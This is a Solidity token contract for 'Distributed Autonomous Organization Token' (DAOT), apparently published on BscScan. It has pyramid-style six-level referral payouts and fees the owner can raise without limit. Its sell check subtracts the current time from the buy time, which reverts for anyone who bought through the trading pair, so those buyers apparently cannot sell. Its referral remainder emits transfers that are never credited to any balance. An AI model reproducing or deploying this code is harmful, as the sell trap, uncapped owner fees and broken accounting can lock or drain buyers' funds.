/**
 *Submitted for verification at BscScan.com on 2022-04-04
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   
    constructor (){
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    function owner() public view returns (address) {
        return _owner;
    }
   
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the ow  ner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
   
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ContractName is Context, IERC20, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function _transfer(address sender,address recipient,uint256 amount) internal virtual {
        add_next_add(recipient);

        if((sender == _pair || recipient == _pair) && swapEnable){
            if(sender == _pair){
                require(amount <= 5000 * 10**18, "buy too many");
                buyTime[recipient] = block.timestamp;
            }
            if(recipient == _pair){
                if(buyTime[sender] != 0){
                    require(buyTime[sender] - block.timestamp > 12 hours, "time no come");
                }
                uint256 balance = balanceOf(sender);
                require(amount <= balance * 9 / 10, "sale too many");
            }
            uint256 senderBalance = _balances[sender];
            require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
            unchecked {
                _balances[sender] = senderBalance - amount;
            }
            amount /= 100;
            _balances[holdAddress] += amount * holdFee;
            emit Transfer(sender, holdAddress, amount * holdFee);
            _balances[backAddress] += amount * backFee;
            emit Transfer(sender, backAddress, amount * backFee);
            _balances[marketAddress] += amount * marketFee;
            emit Transfer(sender, marketAddress, amount * marketFee);
            if(recipient == _pair){
                Intergenerational_rewards(sender, amount * bonusFee);
            }else{
                Intergenerational_rewards(tx.origin, amount * bonusFee);
            }
            uint256 fee = 100 - _liquidityFee;
            _balances[recipient] += (amount * fee);
            emit Transfer(sender, recipient, amount * fee);
                
        }else if(swapEnable){
            amount /= 100;
            _balances[holdAddress] += amount * transferFee;
            emit Transfer(sender, holdAddress, amount * transferFee);

            uint256 fee = 100 - transferFee;
            emit Transfer(sender, recipient, amount * fee);
            uint256 senderBalance = _balances[sender];
            require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
            unchecked {
                _balances[sender] = senderBalance - (amount * 100);
            }
            _balances[recipient] += amount * fee;
        }else{
            emit Transfer(sender, recipient, amount);
            uint256 senderBalance = _balances[sender];
            require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
            unchecked {
                _balances[sender] = senderBalance - amount;
            }
            _balances[recipient] += amount;
        }
    }
    function _mint(address account, uint256 amount) internal virtual { 
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    mapping(address=>address)public pre_add;

    function add_next_add(address recipient)private{
        if(pre_add[recipient] == address(0)){
            if(msg.sender ==_pair)return;
            pre_add[recipient]=msg.sender;
        }
    }
    function Intergenerational_rewards(address sender,uint amount)private{
        address pre = pre_add[sender];
        uint total = amount;
        uint a;
        if(pre!=address(0)){
            a = amount/5*2;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];
        }if(pre!=address(0)){
            a = amount/5;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];
        }if(pre!=address(0)){
            a = amount/10;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];
        }if(pre!=address(0)){
            a = amount/10;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];
        }if(pre!=address(0)){
            a = amount/10;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];
        }if(pre!=address(0)){
            a = amount/10;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];
        }if(total!=0){
            emit Transfer(sender, holdAddress, total);
        }
    }


    address public _pair;

    uint256 public _liquidityFee;
    uint256 public bonusFee = 5;
    uint256 public holdFee = 3;
    uint256 public backFee = 4;
    uint256 public marketFee = 1;
    uint256 public transferFee = 5;
    address public holdAddress = 0x7176F1190DD2550B6dbEf61F503b11243013220c;
    address public backAddress = 0xaEB0FA9e002bd0Cedd3149D7014fF6a435a4d996;
    address public marketAddress = 0x0DEE7b424e52A91c0341948a6C4e6Dd1611Ab0c0;
    mapping(address => uint256) public buyTime;

    bool public swapEnable = false;
    constructor() {
        _name = "Distributed Autonomous Organization Token";
        _symbol = "DAOT";
        _liquidityFee = bonusFee + holdFee + backFee + marketFee;
        _mint(0xf3BE0F21B59Bd0F4b9EFD3bD44b74e7b38eBd113, 50000000 * 10**18);
    }
    
    function setPair(address _target) public onlyOwner{
        _pair = _target;
        swapEnable = true;
    }

    //设置推广费率
    function setBonusFee(uint256 _target) public onlyOwner{
        bonusFee = _target;
        _liquidityFee = bonusFee + holdFee + backFee + marketFee;
    }

    //设置黑洞费率
    function setHoldFee(uint256 _target) public onlyOwner{
        holdFee = _target;
        _liquidityFee = bonusFee + holdFee + backFee + marketFee;
    }

    //设置回流费率
    function setBackFee(uint256 _target) public onlyOwner{
        backFee = _target;
        _liquidityFee = bonusFee + holdFee + backFee + marketFee;
    }

    //设置慈善费率
    function setMarketFee(uint256 _target) public onlyOwner{
        marketFee = _target;
        _liquidityFee = bonusFee + holdFee + backFee + marketFee;
    }

    //设置机制开关
    function setSwapEnable(bool _target) public onlyOwner{
        swapEnable = _target;
    }
    
    //设置转账通缩费率
    function setTransferFee(uint256 _target) public onlyOwner{
        transferFee = _target;
    }

}